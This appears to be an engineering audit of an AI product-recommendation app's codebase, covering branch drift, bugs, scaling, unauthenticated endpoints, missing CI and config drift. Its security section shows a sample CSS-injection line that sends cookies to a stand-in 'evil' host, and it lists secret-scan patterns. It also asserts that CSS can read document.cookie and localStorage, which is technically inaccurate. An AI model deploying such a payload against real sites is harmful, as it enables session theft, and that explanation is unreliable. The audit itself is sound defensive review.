# Codebase Concerns

**Analysis Date:** 2026-04-16
**Branch analyzed:** `v2-with-swipe` (deployed as production main)
**Total commits in history:** 280

> **Severity scale:** Critical / High / Medium / Low
> **Effort scale:** S (≤1d) / M (≤1w) / L (≤2w) / XL (≥1mo)

---

## EXECUTIVE PRIORITY MATRIX

| # | Concern | Severity | Effort |
|---|---------|----------|--------|
| 1 | No CI/CD pipeline whatsoever (no `.github/workflows/`) | Critical | M |
| 2 | No frontend error monitoring (Sentry/Datadog absent) | Critical | S |
| 3 | Affiliate revenue leak — Amazon `tag` empty by default | Critical | S |
| 4 | v2 production missing 96 commits of fixes from v3 branch | Critical | L |
| 5 | Travel intent hangs indefinitely (no timeout recovery in v2) | Critical | M |
| 6 | Description-shift bug: each product describes the next | Critical | M |
| 7 | Unauthenticated `DELETE /conversations/{id}` and `GET /history/{id}` | High | S |
| 8 | Admin config endpoints lack auth dependency | High | S |
| 9 | `MessageList` scroll architecture rebuilt 14+ times — current version still race-prone | High | M |
| 10 | DB pool size 100/worker will exhaust Postgres under load | High | S |
| 11 | LLM cost will explode at 10x traffic — no per-user budget cap | High | M |
| 12 | `chat.py` is 1096 lines — single generator handles entire SSE flow | High | L |
| 13 | Skimlinks + Serper Shopping providers DELETED from v2 (only `.pyc` remains) | High | M |
| 14 | `removeConsole` regression risk — `error`/`warn` exclusion is fragile | Medium | S |
| 15 | GraphState ↔ initial_state coupling causes silent LangGraph crashes | Medium | M |
| 16 | Module-level singleton `langfuse_handler` mixes concurrent traces | Medium | S |
| 17 | DB pool/circuit breaker/intent cache not Redis-backed (multi-worker break) | Medium | M |
| 18 | Two duplicate frontend trees (`frontend/` + `kishan_frontend/`) | Medium | S |
| 19 | `COMPOSER_MAX_TOKENS=80` truncates composer output | Medium | S |
| 20 | No automated test gate before deploy (Vercel/Railway auto-deploy on push) | Critical | M |

---

## Tech Debt

**Branch sprawl — production lags v3 by 96 commits:**
- Issue: The deployed branch `v2-with-swipe` was cherry-picked from `v3-full-implementation`. The v3 branch contains 96 commits of fixes (Phase 23 QA remediation, sentinel scroll, queued-message-on-stream, WCAG contrast, accessory suppression, budget enforcement, Skimlinks integration, Serper Shopping provider, Amazon Creators API migration prep) that never made it to production.
- Files: Run `git log v2-with-swipe..v3-full-implementation --oneline` for the full list
- Impact: Production users hit bugs that have been fixed on v3. Engineering team has an alternate-reality codebase to maintain. Cherry-picking specific fixes risks merge conflicts since v3 has architectural shifts (sentinel scroll, h-dvh changes, Streaming Compose API).
- Fix approach: Either (a) merge v3 → v2-with-swipe and re-test, or (b) declare v2-with-swipe abandoned and promote v3 to production after a full QA pass. The current state is the worst of both worlds.

**Branch graveyard — five active branches indicate unclear release strategy:**
- Branches: `main`, `phase1-implementation`, `v2-with-swipe`, `v3-backup`, `v3-full-implementation`
- Impact: New contributors cannot tell which branch is canonical. PRs may target the wrong branch. `main` is far behind `v2-with-swipe` per `git status` (CLAUDE.md says "v2-with-swipe deployed as production main").
- Fix approach: Define one canonical production branch, archive the rest with tags, document branch strategy in `CLAUDE.md`.

**Phase 23 QA remediation only partially landed in production:**
- Issue: Phase 23 (`.planning/phases/23-qa-remediation-unified-bug-fixes/`) shipped 6 plans worth of fixes between commits `54bdc80` (RED tests) and `15fa24b` (regression gate complete) — covering 19 bugs (QAR-01 through QAR-19). Only the swipe carousel and a handful of others were cherry-picked to v2.
- Files (NOT in v2 production):
  - `1a9ec4c` fix(23-01): 4 product card bugs (fallback continue, single-provider cards, label-domain parity, citation URL validation)
  - `0bd88eb` feat(23-03): travel tool instrumentation + recovery path (silent travel hang fix)
  - `f66a32a` feat(23-04): accessory suppression + budget enforcement (replacement filters, $2,950 espresso machine bug)
  - `cef2f33` feat(23-02): mobile bubble width + nav overlap + overflow-x + custom 404
  - `2b1c653` fix(23-05): sentinel scroll + chat history session tracking + session in URL
  - `3e5f0a3` fix(23-05): WCAG contrast + landscape nav + queued message + browse redirect
- Impact: All bugs documented in `# ReviewGuide.ai — Comprehensive Te.txt` are still present in production: travel hangs, products exceed budget, replacement filters slip through, Amazon links missing, descriptions shifted.
- Fix approach: Cherry-pick or merge Phase 23 commits to v2-with-swipe with regression test runs.

**`langfuse_handler` module-level singleton (carryover from prior audit):**
- Issue: `langfuse_handler = CallbackHandler()` initialized once at module load (line 106). Shared across all concurrent SSE streams. Trace context bleeds between users.
- Files: `backend/app/api/v1/chat.py` lines 85-106, 381 (passed to `astream_events`), 522 (passed to `astream`)
- Impact: Langfuse traces are unreliable for per-user attribution. Multi-user concurrent sessions corrupt each other's trace context.
- Fix approach: Instantiate `CallbackHandler()` inside `generate_chat_stream()` so each request gets an isolated handler. Confirmed unfixed since 2026-03-15 audit.

**`plan_executor_instance` module-level singleton in `AGENT_NAME_TO_INSTANCE`:**
- Issue: `plan_executor_instance = PlanExecutor()` at line 36 of workflow.py is unused for execution (line 412 instantiates fresh) but kept in the agent map.
- Files: `backend/app/services/langgraph/workflow.py` lines 36, 45
- Impact: Dead code that signals the historic cross-session contamination bug (commit `c91d045`). Misleads future contributors.
- Fix approach: Remove from `AGENT_NAME_TO_INSTANCE`, refactor status message lookup to use class-level static method.

**`USE_MCP_PLANNER` feature flag is dead config:**
- Files: `backend/app/core/config.py` line 70
- Impact: Setting the flag has no effect — no production code reads it. Misleads developers.
- Fix approach: Remove the flag (and the dead branch in workflow.py if any).

**`sys.path.insert` sprayed across 14 production modules:**
- Files: `backend/app/agents/*.py`, `backend/app/services/plan_executor.py`, `backend/mcp_server/tools/*.py` (11 files)
- Impact: Packaging workaround is fragile in containers when CWD changes; package imports become non-deterministic.
- Fix approach: Add `mcp_server` as a proper package (add `__init__.py`, install via `pip install -e .` or set `PYTHONPATH` in `docker-compose.yml`).

**Deprecated global callback functions in `plan_executor.py`:**
- Files: `backend/app/services/plan_executor.py` lines 74-92
- Impact: Two parallel callback registries (module-level `_tool_citation_callbacks` vs per-instance `self._citation_callbacks`) can diverge.
- Fix approach: Audit call sites, migrate to instance methods, remove the module-level list.

**Unused TODOs littering production code:**
- `backend/app/services/tiered_router/circuit_breaker.py:5` — "If scaling beyond 3 workers, consider Redis-backed state"
- `backend/app/services/tiered_router/parallel_fetcher.py:179` — "Wire up to actual MCP tools during workflow integration" (raises `NotImplementedError`)
- `backend/app/services/travel/providers/expedia_provider.py:69-168` — Entire Expedia provider is commented stubs
- Impact: Code paths that hit these will crash at runtime. New devs assume features work that don't.

**Two duplicate frontend trees:**
- Directories: `frontend/` (production), `kishan_frontend/` (Jan 2026 alternate, full `node_modules`)
- Impact: ~1GB extra in repo. Confuses tooling. May get accidentally edited/deployed.
- Fix approach: Delete `kishan_frontend/` (recoverable from git history if needed).

---

## Known Bugs

### Frontend (current production)

**Description-shift bug — product descriptions describe the next product:**
- Symptoms: Each product card's description text describes the NEXT product in the list, not the labeled one. Confirmed in two queries (espresso machines and laptops).
- Files: `backend/mcp_server/tools/product_compose.py`, downstream of `backend/mcp_server/tools/product_search.py`
- Trigger: Multi-product responses where the LLM compose loop iterates with off-by-one indexing or improper zip alignment.
- Workaround: None. Highly visible — destroys credibility.
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Tests 4 and 5.

**Travel intent hangs indefinitely with no error UI:**
- Symptoms: "Plan a 5-day trip to Tokyo" stuck on "Thinking..." for 2+ minutes. No timeout, no error toast, no retry.
- Files: `backend/mcp_server/tools/travel_compose.py`, `backend/mcp_server/tools/travel_itinerary.py`
- Trigger: Travel intent requests on production v2-with-swipe.
- Workaround: User must refresh page.
- Status: FIXED in v3 commit `0bd88eb` (Phase 23-03 added `tool_timing` + recovery path) but the fix was never cherry-picked to v2.

**Amazon links completely missing from inline product cards:**
- Symptoms: Bluetooth speakers and headphones queries return ZERO Amazon links. Only eBay links appear despite curated `amzn.to` data existing.
- Files: `backend/app/services/affiliate/providers/curated_amazon_links.py` (142 curated links present), `backend/app/services/affiliate/providers/amazon_provider.py`, `backend/mcp_server/tools/product_compose.py`
- Trigger: Most product queries.
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Tests 1, 3.

**Products exceed user-stated budget:**
- Symptoms: "Best espresso machines under $500" returned a $2,950 Rancilio Silvia.
- Files: `backend/mcp_server/tools/product_compose.py`, `backend/mcp_server/tools/product_search.py`
- Trigger: Queries with explicit budget constraints.
- Status: FIXED in v3 commit `f66a32a` — added `_parse_budget()` and `_extract_price()` to `product_compose.py`. Not in v2.

**Accessory filtering incomplete:**
- Symptoms: "Best laptops for students" returned a MacBook Logic Board (replacement part). "Best air purifier" returned replacement HEPA filters.
- Files: `backend/mcp_server/tools/product_search.py`, `backend/mcp_server/tools/product_compose.py`
- Status: FIXED in v3 commit `f66a32a` (anti-accessory LLM instruction + suppression logic). Not in v2.

**Review citations missing — no Wirecutter/RTINGS/Reddit named:**
- Symptoms: Generic phrases like "Reviewers consistently praise..." with no clickable source.
- Files: `backend/mcp_server/tools/product_compose.py`, `backend/mcp_server/tools/review_search.py`
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Tests 1, 2, 3.

**Mobile sidebar doesn't collapse at 375px:**
- Symptoms: Sidebar takes significant screen real estate on narrow viewports.
- Files: `frontend/components/CategorySidebar.tsx`
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Test 7.

### Backend (carryover from prior audit, unchanged)

**`MockRequest` inline class in production chat endpoint:**
- Files: `backend/app/api/v1/chat.py` lines 240-244
- Trigger: Resuming a halted session with `halt_reason == "consent_required"`.
- Fix: `is_consent_confirmation` should accept `(message: str, action: Optional[str])` directly.

**Debug log statements firing on every request:**
- Files: `backend/app/api/v1/chat.py` lines 30, 522, 523, 586, 606, 612, 718, 719; `backend/app/services/langgraph/workflow.py` lines 337, 401; `backend/app/services/plan_executor.py` lines 187-189; `frontend/app/chat/page.tsx` line 30
- Impact: Log volume, search noise, leaks internal state to logs.
- Fix: Downgrade to `logger.debug()` or remove.

**`print()` statements in `mcp_client.py` bypass structured logging:**
- Files: `backend/app/services/mcp_client.py` lines 138, 152
- Impact: Output goes to container stdout outside log aggregator. CONFIRMED still present.

**Empty Amazon affiliate tags silently generate untracked links:**
- Issue: `AMAZON_ASSOCIATE_TAGS` defaults to `"US:,UK:,DE:,FR:,JP:,CA:,AU:"` (all empty). `parse_associate_tags()` returns `{}`, `settings.AMAZON_ASSOCIATE_TAG` defaults to `""`. Resulting links have no `tag=` parameter.
- Files: `backend/app/core/config.py` lines 267-272; `backend/app/services/affiliate/providers/amazon_provider.py` lines 224-279
- Impact: REVENUE LOSS. Untagged links earn $0.
- Fix: Add startup validation to refuse to start (or warn loudly) if `AMAZON_API_ENABLED=True` and tags are empty.

---

## Fragile Areas

**The `overflow-hidden` vs `overflow-clip` saga — current fix is NOT durable:**

Timeline (v2-with-swipe, in chronological order):
| Commit | Date | Action |
|--------|------|--------|
| `b8626b1` | Phase 3 | "Smart scroll" (initial implementation) |
| `bfef1a3` | — | "Scroll blocking during follow-up loading" |
| `1773f72` | — | "Remove follow-up question bubbles that block scrolling" |
| `ea6f4cc` | 2026-02-13 | "Rewrite scroll logic to detect user intent via wheel/touch" — switched from scroll event to wheel/touchmove, used refs to break re-render loops |
| `75a0c97` | — | "Conversational tone, scroll-to-top, image placeholders" |
| `6db696d` | — | "Prevent mobile horizontal scrolling overflow" |

Additional v3 work NOT in v2 production:
| Commit | Action |
|--------|--------|
| `cef2f33` | overflow-hidden → overflow-clip in 6 places (Message.tsx, ChatContainer.tsx, chat/page.tsx, globals.css) |
| `2b1c653` | Sentinel scroll architecture, `-webkit-overflow-scrolling: touch`, `overscrollBehaviorY: contain` |
| `5d0b595` | Allow scrolling up during streaming |
| `022f7eb` | Scroll to bottom after sending message |
| `dbdd910` | Throttle auto-scroll to 400ms |
| `083132b` | Track touch state to prevent scroll fight on mobile |
| `74b1b3d` | h-dvh double-viewport + min-h-0 fix |
| `bab036f` | Add h-full to template.tsx motion.div |
| `f6735ab` | Add min-h-0 to all flex-1 children in chat scroll chain |

Why current production fix is fragile:
- `frontend/app/chat/page.tsx` lines 130, 133, 145 still use `overflow-hidden` (the v3 `overflow-clip` migration was not cherry-picked).
- `frontend/components/MessageList.tsx` uses `wheel`/`touchmove` event detection (commit `ea6f4cc`) but the v3 sentinel ref pattern (`bottomRef.scrollIntoView`) was a different approach. Current production code mixes both: scrolls to `message-${newestAi.id}` element via `scrollIntoView({block: 'start'})`. If a new assistant message renders between rAF and scroll, scroll target is stale.
- `userScrolledUpRef` mutates on wheel/touch but is not cleared if the user scrolls back to bottom via scrollbar drag (only checked on `scrollend`).
- The `flex-1 overflow-y-auto` pattern depends on parent height chain (all flex-1 children must have `min-h-0`). v2-with-swipe is missing the `min-h-0` chain fix from v3 commit `f6735ab` — scroll may break in deep flex layouts.

Recommendation: Cherry-pick v3 commits `74b1b3d`, `bab036f`, `f6735ab`, `2b1c653`, `cef2f33` as a group to make scroll durable.

**`backend/app/api/v1/chat.py` (1096 lines) — monolithic SSE generator:**
- Files: `backend/app/api/v1/chat.py`
- Why fragile: `generate_chat_stream()` spans ~800 lines handling halt state detection, session loading, state initialization, SSE event forwarding, post-stream persistence, QoS logging, Langfuse flushing in a single async generator. Any change risks side-effecting another concern.
- Safe modification: Comments reference RFC sections (§1.1, §4.1, §4.2). Do NOT reorder `yield` calls — SSE event ordering is load-bearing for the frontend parser.
- Test coverage: `backend/tests/test_chat_api.py`, `backend/tests/test_sse_events.py` exist but do not cover full execution path.

**`Message.tsx` render functions — formerly "protected", now extracted to `BlockRegistry.tsx`:**
- Files: `frontend/components/Message.tsx` (305 lines), `frontend/components/blocks/BlockRegistry.tsx` (218 lines)
- Why "protected" historically: 14 inline `renderXxx()` functions handled `ui_blocks` types. Touching one rendering branch could break others because they shared state and ordering.
- CURRENT state: Render functions were extracted to a registry pattern in commit `9cf07f3` (Phase 14-03). Each renderer is now a `(block: NormalizedBlock) => JSX.Element | null` mapping in `BLOCK_RENDERERS`. This is much safer.
- Remaining fragility:
  - `BlockRegistry.tsx` lines 145-189 still has special-case grouping logic (travel-grid, product-review-carousel) using local mutable flags `travelGridRendered` and `productReviewCarouselRendered`. Two passes through `blocks.map` could double-render.
  - `dangerouslySetInnerHTML` in line 89 (`comparison_html` renderer) sanitizes via DOMPurify but allows `style` and `target/rel` attrs — if backend ever emits malformed HTML, render breaks silently.
  - The `_products` wildcard fallback (line 193) means new block types like `electronics_products` automatically render as `products` carousel — silent contract drift.
- Memory says "All render functions in Message.tsx are protected — never modify ui_blocks logic" — that documentation is now STALE. Should be updated to reference BlockRegistry.tsx.

**`backend/app/services/plan_executor.py` — shared `self.context` dict:**
- Files: `backend/app/services/plan_executor.py` (912 lines)
- Why fragile: Tools write results to `self.context` using keys like `"step_id.key"`. Two parallel tools writing overlapping keys silently overwrite each other. No collision detection.
- Safe modification: Always pass unique step IDs. Verify `output_key` is not reused across parallel steps.
- Test coverage: NO dedicated test file for `PlanExecutor`. Marked High priority.

**`backend/app/agents/clarifier_agent.py` (966 lines) — multi-turn logic interleaved:**
- Files: `backend/app/agents/clarifier_agent.py`
- Why fragile: Halt state detection, slot extraction (regex + JSON parsing), and resume logic are interleaved. Reads halt state from BOTH Redis AND workflow-passed state — these can diverge.
- Safe modification: Do NOT add new slot types without updating `tool_contracts.py` and re-testing multi-turn flows end-to-end.
- Test coverage: NO `test_clarifier_agent.py` exists.

**`MessageList.tsx` scroll architecture is still race-prone:**
- Files: `frontend/components/MessageList.tsx`
- Why fragile: Three useEffects with overlapping concerns (user scroll detection, jump button visibility, new-message scroll). The "scroll to top of new AI message" effect uses `requestAnimationFrame` then `getElementById` then `scrollIntoView` — if React unmounts/remounts in StrictMode (which is enabled in `next.config.js`), the rAF callback fires after element is gone. No null check after rAF.
- Specific risk: Line 84-87 `el.scrollIntoView({behavior:'smooth', block:'start'})` will silently no-op if `getElementById` returns null. There's no fallback.

**Multiple `Math.random()` calls in components for ID generation:**
- Files: `frontend/app/chat/page.tsx` lines 39, 61, 98 — UUID v4 generation
- Why fragile: These are inside `'use client'` components, so SSR is bypassed for the relevant component. But the pattern (UUID generated on first render, persisted to localStorage) is repeated 3 times. Risk of session ID divergence if effect timing changes.
- Better: Extract to `lib/uuid.ts` helper.

---

## Scalability Concerns

**LLM cost will explode at 10x traffic — no per-user budget cap:**
- Issue: Every chat request fires Safety + Intent + Planner + Clarifier + multiple Composer LLM calls (4-7 GPT-4o-mini calls minimum per query). At ~$0.0003 per call avg, current usage is ~$0.002/query. At 10x traffic = ~$2k/mo for 1M queries. At 100x = $20k/mo. Spot-check-resistant runaway users (bots, abuse) can burn through budget in hours with no kill switch.
- Files: `backend/app/services/model_service.py`, `backend/app/agents/*.py`
- Mitigation present: Per-user rate limit (`RATE_LIMIT_PER_IP=100`, `RATE_LIMIT_GUEST_REQUESTS=20/min`). NO LLM-cost-aware budget cap.
- Fix approach: Track per-user LLM token spend in Redis (using existing `LOG_API_COSTS` flag and `api_usage_logs` table); reject requests when user exceeds a daily $ ceiling.

**Redis memory at 100x:**
- Issue: Redis caches search results (`SEARCH_CACHE_TTL`), travel results (`TRAVEL_CACHE_TTL=3600`), halt states (`HALT_STATE_TTL=3600`), chat history (`CHAT_HISTORY_CACHE_TTL=3600`), config snapshots, intent cache, conversation summaries. All TTLs are 1h+. At 100x users with avg 10 cached items each = 10M keys.
- Files: `backend/app/services/halt_state_manager.py`, `backend/app/services/chat_history_manager.py`, `backend/app/services/config_cache.py`
- Mitigation: TTLs prevent infinite growth. NO maxmemory policy explicitly set in `docker-compose.yml`.
- Fix approach: Set `redis-server --maxmemory 1gb --maxmemory-policy allkeys-lru` in compose. Monitor key count via `redis-cli DBSIZE`.

**DB connection pool exhaustion under multi-worker (UNCHANGED FROM PRIOR AUDIT):**
- Issue: `DB_POOL_SIZE=50`, `DB_MAX_OVERFLOW=50` = 100 connections per worker. Standard Postgres allows 100 connections total. Two backend workers exhaust the DB.
- Files: `backend/app/core/config.py` lines 55-56
- Impact: `too many connections` errors as soon as workers >= 2.
- Fix approach: Reduce defaults to `DB_POOL_SIZE=10, DB_MAX_OVERFLOW=5` per worker, or introduce PgBouncer in front of Postgres.

**SSE concurrency — async generator per connection:**
- Issue: Each `/v1/chat/stream` connection holds an open async generator for 30-90s. FastAPI/Uvicorn is async so connections aren't 1:1 with threads, but each connection holds: a Redis connection (history check), a DB session (history persistence), a Langfuse trace context, and the LangGraph state in memory.
- Files: `backend/app/api/v1/chat.py` `generate_chat_stream`
- Mitigation: `REDIS_MAX_CONNECTIONS=50`. NO max concurrent SSE streams enforced.
- Fix approach: Add a global semaphore in `chat.py` capped at e.g. 200. Reject 503 with Retry-After header beyond that.

**Affiliate API rate limits — no centralized rate limiter:**
- Issue: Amazon PA-API has 1 TPS per Associates account by default (10 TPS escalated). eBay Browse API is 5000/day. SerpAPI has tier-based limits (250/mo on free tier). Each provider hits its own external API independently with no centralized throttling.
- Files: `backend/app/services/affiliate/providers/*.py`, `backend/app/services/serpapi/client.py`
- Mitigation: `REDIS_RETRY_MAX_ATTEMPTS=3` for Redis only. Circuit breaker exists for external APIs (`backend/app/services/tiered_router/circuit_breaker.py`) but is in-process per-worker — NOT shared across workers. Failure on worker A doesn't trip breaker on worker B.
- Fix approach: Migrate circuit breaker state to Redis (the `TODO` comment in `circuit_breaker.py` line 5 already calls this out).

**In-process intent cache is wasted at >1 worker (UNCHANGED):**
- Issue: `_intent_cache: Dict` in `backend/app/agents/intent_agent.py` is process-local. Each Gunicorn worker has its own; cache misses multiplied by N workers.
- Fix: Migrate to Redis-backed cache.

---

## Security Vulnerabilities

**No CSRF protection on state-changing endpoints:**
- Issue: `POST /v1/chat/stream`, `DELETE /conversations/{id}`, `POST /v1/admin/config`, etc. accept JSON without CSRF tokens. SameSite cookies are not set.
- Files: `backend/app/main.py` (no CSRF middleware registered), `backend/app/api/v1/chat.py`, `backend/app/api/v1/admin.py`
- Mitigation: CORS restricts origins, BUT `allow_credentials=True` + `CORS_ORIGIN_REGEX=https://.*\.vercel\.app` is permissive. Any deployed Vercel domain (preview from any account) gets credentialed access.
- Fix approach: Add CSRF middleware (e.g. `starlette-csrf`), or restrict CORS regex to your account's Vercel team.

**Unauthenticated `DELETE /conversations/{session_id}` and `GET /history/{session_id}` (UNCHANGED):**
- Files: `backend/app/api/v1/chat.py` lines 924-986
- Impact: Anyone who knows or guesses a UUID session_id can read or delete arbitrary conversations.
- Fix: Add `Depends(get_current_user)` and verify session ownership before action.

**Most admin config endpoints lack auth (UNCHANGED):**
- Files: `backend/app/api/v1/admin.py` lines 73-167
- Impact: Anyone can hit `POST/PUT/DELETE /v1/admin/config` to mutate runtime config (model selection, rate limits, feature flags).
- Fix: Either register `AdminAuthMiddleware` (currently dead code in `backend/app/middleware/admin_auth_middleware.py`) or add `Depends(get_current_admin_user)` to every admin endpoint.

**Raw exception messages exposed to API clients (UNCHANGED):**
- Files: `backend/app/api/v1/admin.py` lines 86, 105, 118-165, 391, 440, 503; `backend/app/api/v1/chat.py` lines 904, 947, 985
- Pattern: `raise HTTPException(status_code=500, detail=f"Failed to ...: {str(e)}")`
- Impact: Database table names, query structure, stack traces leak via HTTP responses.
- Fix: Static user-facing message in `detail`, log `str(e)` server-side.

**`DEBUG=True` is the default (UNCHANGED):**
- Files: `backend/app/core/config.py` line 17
- Impact: Debug mode active unless explicitly overridden in deploy env. CLAUDE.md doesn't enforce this for Railway.
- Fix: Default `False`, require explicit opt-in for development.

**XSS surface — `dangerouslySetInnerHTML` in 2 places:**
- Files:
  - `frontend/app/layout.tsx` line 35 — inline theme detection script (safe, no user data)
  - `frontend/components/blocks/BlockRegistry.tsx` line 90 — `comparison_html` block sanitized via DOMPurify with `ADD_TAGS: ['style']` and `ADD_ATTR: ['target','rel']`
- Risk: Adding `<style>` to allowed tags re-opens CSS injection (e.g. `<style>body{background:url('http://evil/leak?'+document.cookie)}</style>` exfiltrates cookies). Mitigated by httpOnly session cookies, but admin auth uses JWT in localStorage — readable by injected CSS via background-image data URLs.
- Fix: Remove `style` from `ADD_TAGS`, render comparison HTML client-side via React components instead of trusted HTML.

**SQL injection assessment: SAFE (parameterized queries throughout):**
- Reviewed: `backend/app/repositories/admin_user_repository.py` line 174 has dynamic UPDATE but uses `text(query), params` with `:field` named params — safe.
- ORM usage everywhere else (SQLAlchemy 2.0 async). No `f"SELECT ... {user_input}"` patterns found.

**No hardcoded API keys in source:**
- Scanned for patterns: `sk-`, `pk_`, `AKIA`, hardcoded tokens — none found in source. Keys live in `.env` (correctly gitignored).

**`.env` exists in repo root but `.gitignore` excludes it (verified):**
- Files: `.gitignore` line 19 (`.env`), root has `.env` file
- Risk: NONE detected — file is excluded.
- Watch: Ensure no future commit accidentally `git add -f .env`.

---

## Missing Infrastructure

**NO CI/CD PIPELINE — `.github/workflows/` does not exist:**
- This is the single most significant infrastructure gap.
- Impact:
  - No automated tests on PR (none of the 60+ frontend tests run before merge)
  - No build verification (Vercel/Railway only catch errors at deploy time, after commit lands on main)
  - No security scanning (npm audit, pip audit not run)
  - No dependency vulnerability alerts in GitHub
  - No code coverage reporting
  - Releases are entirely manual (no tag automation, no changelog generation)
- Fix approach: Create `.github/workflows/ci.yml` running:
  ```yaml
  - frontend: npm ci && npm run lint && npm run test:run && npm run build
  - backend: pip install -r requirements.txt && pytest && ruff check && black --check
  - secret-scan: gitleaks
  ```
  Block merge to main if CI fails.

**NO automated test gate before deploy:**
- Vercel auto-deploys on push to main (via `vercel.json` integration). Railway auto-deploys backend on push.
- A push that breaks tests will deploy. The frontend test suite has 60+ tests in `frontend/tests/` and backend has ~20 test files in `backend/tests/` — all unverified pre-deploy.
- Fix: Above CI gate + Vercel "Ignored Build Step" running tests, exit 1 to skip deploy on failure.

**NO frontend error monitoring (Sentry, Datadog, Honeybadger):**
- Scanned: zero references to `Sentry`, `@sentry`, `datadog` in `frontend/`.
- Impact: Production JS errors are invisible. The `removeConsole: { exclude: ['error', 'warn'] }` config only retains the calls — they fire to user's browser console, not to a monitoring service.
- Fix: Add `@sentry/nextjs` (free tier covers 5k errors/mo).

**NO backend error monitoring (Sentry):**
- Scanned: zero references to `Sentry` in `backend/`.
- Impact: Unhandled exceptions only reach Railway logs. No deduplication, no alerting, no stack trace context.
- Fix: Add `sentry-sdk[fastapi]` with FastAPI integration.

**Langfuse coverage is LLM-only:**
- Files: `backend/app/api/v1/chat.py` lines 85-106 (initialization), 381 (passed to graph)
- Coverage: Only LangGraph callback events (LLM calls, agent transitions). No HTTP request tracing (auto-instrumentation explicitly disabled in `main.py` line 96).
- Gap: SSE stream errors, Redis errors, DB errors do NOT appear in Langfuse.
- Fix: Add custom Langfuse spans around critical infra operations OR add a dedicated APM (see Sentry above).

**NO alerting:**
- No Slack/PagerDuty webhooks for: high error rate, degraded latency, circuit breaker tripped, affiliate API down, DB connection pool exhausted.
- Fix: Use Railway's built-in alerts (deploy failure, container restart) at minimum. Better: route Sentry alerts to Slack.

**NO uptime monitoring:**
- No external uptime checks (UptimeRobot, BetterStack) on `/health` endpoint.
- Fix: Add at minimum a free UptimeRobot check.

**NO automated dependency updates:**
- No `dependabot.yml` or `renovate.json` config.
- Impact: Security patches require manual `npm audit` runs. The `frontend/node_modules/` already has `node_modules/.github/workflows/` from third-party deps — those don't run for us, they came with packages.
- Fix: Add `.github/dependabot.yml` for npm + pip.

---

## Dependency Risks

**Frontend stack (current):**
| Package | Current | Latest stable (Apr 2026) | Risk |
|---------|---------|--------------------------|------|
| Next.js | 14.2.35 | 15.x | Next 14.2 is on long-term support but Next 15 is the active line. Migration is non-trivial (React 19, async cookies/headers, caching default change). |
| React | 18.2.0 | 19.x | React 19 supports `use()`, async transitions, new compiler. Significant ecosystem churn. Currently fine. |
| TypeScript | 5.3.3 | 5.4+ | Minor risk; safe to upgrade. |
| Tailwind | 3.3.6 | 3.4 / v4 alpha | Tailwind v4 is a rewrite. Defer. |
| Vitest | 4.0.17 | 4.x | Current. |
| MUI | 7.3.5 | 7.x | Current. |
| Framer Motion | 12.26.2 | 12.x | Current. |

**Backend stack (current):**
| Package | Current | Latest stable | Risk |
|---------|---------|---------------|------|
| FastAPI | 0.121.0 | 0.121+ | Current. |
| LangGraph | 1.0.2 | 1.x | Recently hit 1.0 — API stability not battle-tested. |
| LangChain | 1.0.4 | 1.x | Same — early-1.0 churn risk. |
| OpenAI Python | 2.7.1 | 2.x | Current. |
| Anthropic | 0.72.0 | 0.x | Anthropic SDK still pre-1.0 — breaking changes likely. |
| pydantic | 2.12.4 | 2.x | Current. |
| SQLAlchemy | 2.0.44 | 2.0.x | Current. |
| litellm | 1.79.1 | 1.x | Active churn — every minor release has breaking model name changes. |
| amadeus | 12.0.0 | 12.x | Current. |
| google-search-results (SerpAPI) | 2.4.2 | 2.4.x | Officially deprecated by SerpAPI in favor of native HTTP. Migration recommended. |

**Known deprecations / vendor risks:**

- **Amazon PA-API v5 retires May 15, 2026** — hard deadline, ~30 days from analysis date. Source: `.planning/STATE.md` "Blockers/Concerns". Code references PA-API in `backend/app/services/affiliate/providers/amazon_provider.py` lines 477-498 but `AMAZON_API_ENABLED=False` by default (mock mode is default). Migration to Amazon Creators API is in v3 branch (commits `6f9cca0`, `a118bc2`) — NOT in v2.
- **`toon-python` removed from PyPI** — was vendored locally as a workaround. See `requirements.txt` line 108-109 comment, vendored at `backend/app/lib/toon_python`. Permanent dependency on a forked package with no upstream.
- **SerpAPI Python SDK deprecated** — `google-search-results` package is unmaintained. Switch to native `httpx` calls.
- **Anthropic SDK pre-1.0** — `0.72` likely breaks on next major bump. Pin tighter or vendor wrapper.

**Vendor lock-in:**
- LangGraph: Workflow logic is tightly coupled to LangGraph state machine API. Migration to LangChain Expression Language (LCEL) or alternatives (CrewAI, AutoGPT, custom) would require full rewrite.
- OpenAI: Default model is `gpt-4o-mini` everywhere. Switching to Anthropic/local models requires updating 5 model env vars + testing each agent's prompts.
- Vercel: Frontend deploy + edge functions + analytics tied to Vercel. Migration to Cloudflare Pages / Netlify is straightforward but loses Vercel Analytics.
- Railway: Backend deployment + Postgres + Redis hosted on Railway. Migration to Render / Fly.io is feasible but requires re-creating env, secrets, DB dump/restore.

---

## Configuration Drift

**Local dev (`backend/.env`) vs `docker-compose.yml` defaults:**
- `docker-compose.yml` line 60 hardcodes CORS_ORIGINS as JSON array string.
- `backend/app/core/config.py` line 23 defaults CORS_ORIGINS as comma-separated string.
- These two formats differ — pydantic validator at line 32 handles both, but the inconsistency is a footgun.

**Docker Compose vs Railway production:**

| Variable | docker-compose.yml | Railway (per CLAUDE.md memory) | Drift Risk |
|----------|-------------------|-----------------|------------|
| `DEBUG` | `${DEBUG:-true}` | unknown | HIGH — local dev ON by default, prod must explicitly disable |
| `CORS_ORIGINS` | hardcoded JSON | env var | Medium — formatting differs |
| `CORS_ORIGIN_REGEX` | not present | `https://.*\.vercel\.app` | Critical — without this, Vercel preview URLs are blocked. CLAUDE.md memory documents this as a past production outage. |
| `ENABLE_SERPAPI` | `${ENABLE_SERPAPI:-false}` | was MISSING for a period (per memory) | HIGH — `review_search` silently returns empty when missing |
| `SERPAPI_API_KEY` | env var | was MISSING (per memory) | HIGH — same |
| `RATE_LIMIT_ENABLED` | `${...:-true}` | env var | Medium |
| `AMAZON_ASSOCIATE_TAG` / `AMAZON_ASSOCIATE_TAGS` | env var | per memory: migrated `mikejahshan-20` → `revguide-20` | Critical — empty defaults silently kill affiliate revenue |
| `LANGFUSE_*` keys | env var | env var | Medium — missing keys disable tracing silently |
| `IPINFO_TOKEN` | env var | env var | Low |

**Vercel production vs local:**
- Local: `NEXT_PUBLIC_API_URL=http://localhost:8000`
- Vercel: must point to Railway backend URL. If wrong → all chat fails silently with CORS error. Per CLAUDE.md memory, this was a past incident.
